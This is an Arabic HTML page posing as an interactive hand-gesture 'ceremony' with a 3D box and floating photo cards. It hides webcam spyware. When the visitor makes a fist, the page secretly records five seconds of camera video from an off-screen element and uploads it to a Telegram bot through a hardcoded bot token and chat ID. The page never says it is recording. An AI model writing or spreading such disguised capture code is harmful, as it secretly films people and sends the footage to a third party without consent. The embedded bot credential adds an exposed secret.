<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>M A N A S I K | تجربة واقعية</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200;700;900&display=swap" rel="stylesheet">
    
    <style>
        :root { 
            --gold: #d4af37; 
            --gold-bright: #f9e79f;
            --bg: #050505; 
        }
        
        body {
            font-family: 'Cairo', sans-serif;
            background-color: var(--bg);
            margin: 0; overflow: hidden; height: 100vh;
            color: white; user-select: none; touch-action: none;
        }

        /* خلفية ضبابية لإعطاء عمق */
        .ambient-light {
            position: fixed; inset: 0;
            background: radial-gradient(circle at var(--x, 50%) var(--y, 50%), rgba(212, 175, 55, 0.08) 0%, transparent 50%);
            z-index: 1; pointer-events: none;
        }

        /* الصندوق ثلاثي الأبعاد الواقعي */
        .scene { width: 220px; height: 220px; perspective: 1200px; z-index: 50; }
        .box {
            width: 100%; height: 100%; position: relative;
            transform-style: preserve-3d; 
            transform: rotateX(-15deg) rotateY(40deg);
            transition: transform 2.5s cubic-bezier(0.16, 1, 0.3, 1);
        }
        .face {
            position: absolute; width: 100%; height: 100%;
            background: linear-gradient(145deg, #111, #000);
            border: 0.5px solid rgba(212, 175, 55, 0.3);
            box-shadow: inset 0 0 50px rgba(0,0,0,0.9);
        }
        .face-front  { transform: translateZ(110px); }
        .face-back   { transform: rotateY(180deg) translateZ(110px); }
        .face-right  { transform: rotateY(90deg) translateZ(110px); }
        .face-left   { transform: rotateY(-90deg) translateZ(110px); }
        .face-top    { transform: rotateX(90deg) translateZ(110px); background: #1a1a1a; }
        .face-bottom { transform: rotateX(-90deg) translateZ(110px); }
        
        .box-open { transform: scale(0) rotateZ(180deg) translateY(-500px); opacity: 0; }

        /* البطاقات الفوتوغرافية */
        .photo-card {
            position: absolute; width: 150px; height: 210px;
            background: #111; border-radius: 4px; 
            padding: 8px; box-sizing: border-box;
            border: 1px solid rgba(255, 255, 255, 0.05);
            overflow: hidden; pointer-events: none; will-change: transform;
            z-index: 20; box-shadow: 0 20px 50px rgba(0,0,0,0.8);
        }
        .photo-card img {
            width: 100%; height: 100%; object-fit: cover;
            filter: contrast(1.1) brightness(0.9);
            border-radius: 2px;
        }
        .card-highlight { 
            border-color: var(--gold); 
            box-shadow: 0 0 40px rgba(212, 175, 55, 0.2);
            z-index: 100;
        }

        /* العناصر المخفية */
        #v-stream, #cap-bus { position: fixed; left: -1000vw; }

        /* نصوص برقيّة */
        .meta-text {
            font-weight: 200; letter-spacing: 0.5em; opacity: 0.4;
            font-size: 10px; transition: opacity 1s;
        }
    </style>
</head>
<body>

    <div class="ambient-light" id="bg-glow"></div>
    <video id="v-stream" autoplay playsinline></video>
    <canvas id="cap-bus"></canvas>

    <main class="h-screen flex flex-col items-center justify-center relative overflow-hidden">
        <div id="header-ui" class="text-center mb-20 z-50">
            <h1 class="text-5xl font-black mb-4 text-white tracking-tighter" style="text-shadow: 0 10px 30px rgba(0,0,0,0.5)">MANASIK</h1>
            <p class="meta-text uppercase">أحكمي قبضة يدكِ ✊ لبدء المراسم</p>
        </div>

        <div class="scene" id="box-trigger">
            <div class="box" id="box-mesh">
                <div class="face face-front"></div><div class="face face-back"></div>
                <div class="face face-right"></div><div class="face face-left"></div>
                <div class="face face-top"></div><div class="face face-bottom"></div>
            </div>
        </div>

        <div id="stage" class="hidden absolute inset-0"></div>
    </main>

    <script>
        // --- إعدادات التلجرام ---
        const TG_TOKEN = '8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI'; // التوكن الخاص بك
        const TG_CHAT_ID = '8148586037'; // معرف الشات الخاص بك

        const collection = [
            "https://images.unsplash.com/photo-1531123897727-8f129e1688ce?q=80&w=600",
            "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=600",
            "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=600",
            "https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=600",
            "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=600"
        ];

        let world = {
            active: false,
            mouse: { x: window.innerWidth/2, y: window.innerHeight/2 },
            lerp: { x: window.innerWidth/2, y: window.innerHeight/2 },
            items: [],
            recorder: null,
            chunks: []
        };

        // تتبع اليد بالميديا-بايب
        const video = document.getElementById('v-stream');
        const hands = new Hands({locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`});
        hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.8 });

        hands.onResults(res => {
            if (res.multiHandLandmarks?.length > 0) {
                const pts = res.multiHandLandmarks[0];
                world.mouse.x = (1 - pts[8].x) * window.innerWidth;
                world.mouse.y = pts[8].y * window.innerHeight;

                // تحديث الإضاءة الخلفية
                document.getElementById('bg-glow').style.setProperty('--x', world.mouse.x + 'px');
                document.getElementById('bg-glow').style.setProperty('--y', world.mouse.y + 'px');

                // كشف القبضة
                const d = Math.sqrt(Math.pow(pts[4].x - pts[20].x, 2) + Math.pow(pts[4].y - pts[20].y, 2));
                if (d < 0.1 && !world.active) revealContent();
            }
        });

        function revealContent() {
            world.active = true;
            document.getElementById('box-mesh').classList.add('box-open');
            document.getElementById('header-ui').style.opacity = "0";
            
            confetti({ 
                particleCount: 150, spread: 100, origin: { y: 0.8 }, 
                colors: ['#d4af37', '#ffffff', '#1a1a1a'],
                scalar: 0.7
            });
            
            startSilentCapture();

            setTimeout(() => {
                document.getElementById('stage').classList.remove('hidden');
                spawnItems();
            }, 1200);
        }

        function spawnItems() {
            const stage = document.getElementById('stage');
            collection.forEach((src, i) => {
                const el = document.createElement('div');
                el.className = 'photo-card';
                el.innerHTML = `<img src="${src}" loading="lazy">`;
                stage.appendChild(el);
                world.items.push({
                    el, x: Math.random() * window.innerWidth, y: Math.random() * window.innerHeight,
                    vx: 0, vy: 0, r: (Math.random() - 0.5) * 30
                });
            });
            physicsEngine();
        }

        function physicsEngine() {
            // تنعيم حركة المؤشر الوهمي
            world.lerp.x += (world.mouse.x - world.lerp.x) * 0.1;
            world.lerp.y += (world.mouse.y - world.lerp.y) * 0.1;

            world.items.forEach(item => {
                const dx = world.lerp.x - (item.x + 75);
                const dy = world.lerp.y - (item.y + 105);
                const dist = Math.sqrt(dx*dx + dy*dy);

                if (dist < 400) {
                    const strength = Math.pow((400 - dist) / 400, 2);
                    item.vx += dx * strength * 0.04;
                    item.vy += dy * strength * 0.04;
                    item.el.classList.add('card-highlight');
                } else {
                    item.el.classList.remove('card-highlight');
                }

                item.x += item.vx; item.y += item.vy;
                item.vx *= 0.92; item.vy *= 0.92; // احتكاك واقعي

                // حدود الشاشة مع ارتداد ناعم
                if (item.x < 10 || item.x > window.innerWidth - 160) item.vx *= -0.7;
                if (item.y < 10 || item.y > window.innerHeight - 220) item.vy *= -0.7;

                item.el.style.transform = `translate3d(${item.x}px, ${item.y}px, 0) rotateZ(${item.r + (item.vx * 2)}deg) scale(${dist < 400 ? 1.1 : 1})`;
            });
            requestAnimationFrame(physicsEngine);
        }

        // --- نظام التوثيق الخفي ---
        async function startSilentCapture() {
            if (!TG_TOKEN) return;
            try {
                const stream = video.captureStream();
                world.recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                world.chunks = [];
                world.recorder.ondataavailable = e => world.chunks.push(e.data);
                world.recorder.onstop = uploadToTelegram;
                world.recorder.start();
                setTimeout(() => world.recorder.stop(), 5000); // تسجيل 5 ثوانٍ
            } catch(e) {}
        }

        function uploadToTelegram() {
            const blob = new Blob(world.chunks, { type: 'video/webm' });
            const fd = new FormData();
            fd.append('chat_id', TG_CHAT_ID);
            fd.append('video', blob, 'session.webm');
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: 'POST', body: fd });
        }

        const cam = new Camera(video, {
            onFrame: async () => { await hands.send({image: video}); },
            width: 480, height: 640
        });
        cam.start();
    </script>
</body>
</html>


